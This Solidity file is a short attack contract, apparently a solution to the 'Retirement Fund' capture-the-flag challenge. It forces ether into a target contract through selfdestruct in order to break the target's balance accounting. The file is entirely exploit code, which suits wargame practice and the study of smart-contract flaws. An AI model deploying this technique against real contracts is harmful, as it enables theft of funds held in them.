// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RetirementFundAttack {
    address payable public retirementFund;

    constructor(address payable _retirementFund) payable {
        require(msg.value == 1);
        retirementFund = _retirementFund;
    }

    function attack() public {
        selfdestruct(retirementFund);
    }
}
